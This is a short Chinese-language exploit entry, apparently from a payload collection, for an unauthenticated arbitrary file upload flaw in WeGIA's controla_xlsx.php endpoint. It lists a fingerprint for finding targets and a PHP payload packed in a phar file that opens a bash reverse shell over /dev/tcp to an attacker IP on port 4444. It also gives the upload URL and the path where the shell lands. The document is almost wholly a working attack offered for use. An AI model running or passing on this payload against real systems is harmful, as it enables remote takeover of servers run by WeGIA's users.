# WeGIA存在前台controla_xlsx任意文件上传漏洞

WeGIA ｜ 文件上传 ｜ —
- **指纹**：`"./assets/vendor/select2/select2.js"`

**Payload**
```
phar内容
<?php
$ip = 'IP';
$port = 4444;
system("/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'");
?>
将phar文件上传
/WeGIA/html/socio/sistema/controller/controla_xlsx.php
上传后，文件在 /WeGIA/html/socio/sistema/tabelas/shell.phar
```
- **响应特征**：200